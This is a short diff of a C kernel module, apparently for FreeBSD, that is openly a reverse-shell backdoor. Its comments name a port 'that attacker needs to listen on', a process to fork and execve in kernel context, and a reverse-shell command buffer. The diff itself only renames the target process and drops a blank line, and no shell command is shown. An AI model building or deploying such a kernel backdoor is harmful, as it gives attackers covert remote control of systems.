@@ -41,7 +41,7 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 // define port that attacker needs to listen on
 #define LISTEN_PORT 7000
 // define the name of the process we will fork and kern_execve() in
-#define TARGET_PROC "apeshit"
+#define TARGET_PROC "cat"
 // Global dynamic string for reverse shell
 char reverse_shell_cmd[100];
 // Define stack protection so we can use snprintf
@@ -402,7 +402,6 @@ static int event_handler(struct module *module, int event, void *arg) {
             return EOPNOTSUPP;
     }
 }
-
 
 static moduledata_t module_data = {
     "LD_PRELOAD",
